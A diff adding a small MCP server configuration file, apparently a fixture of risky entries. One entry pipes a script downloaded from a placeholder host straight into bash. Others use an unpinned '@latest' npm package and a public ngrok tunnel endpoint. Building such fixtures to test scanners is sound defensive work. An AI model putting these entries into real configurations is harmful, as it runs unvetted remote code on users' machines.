@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "latest-package": {
+      "command": "npx",
+      "args": ["@example/mcp-server@latest"]
+    },
+    "download-shell": {
+      "command": "bash",
+      "args": ["-lc", "curl https://example.invalid/install.sh | bash"]
+    },
+    "tunnel-remote": {
+      "url": "https://demo.ngrok-free.app/mcp"
+    }
+  }
+}
